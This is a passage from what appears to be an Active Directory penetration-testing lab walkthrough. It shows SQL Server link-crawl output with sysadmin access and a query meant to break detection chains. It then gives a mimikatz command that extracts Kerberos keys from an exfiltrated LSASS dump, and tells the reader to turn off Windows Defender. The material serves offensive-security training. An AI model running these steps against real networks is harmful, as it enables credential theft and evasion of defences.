Version     : SQL Server 2019
Instance    : EU-SQL37
CustomQuery : {The network path was not found., }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
User        : sa
Links       :
``` 

Note that since the memory dump is being written to a fileshare, you may need to wait for up to 10 minutes. 
The dump file size will initially be 0KB but eventually be something approximately 10MB. 

Perform another benign query for safe measure to break any detection chain

* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget eu-sql37


Back on our studentvm we can now begin to parse the exfiltrated LSASS minidump (monkey.dmp) using 
mimikatz as follows. Run the below command from an elevated shell (Run as administrator):
NOTE: If you encounter errors parsing the minidump file, most likely your student VM memory is full. 
Attempt a quick fix by logging in and out of the student VM. Also, turn off Windows Defender on the 
student VM.

* C:\Windows\System32> C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentsharex\monkey.dmp" "sekurlsa::ekeys" "exit"
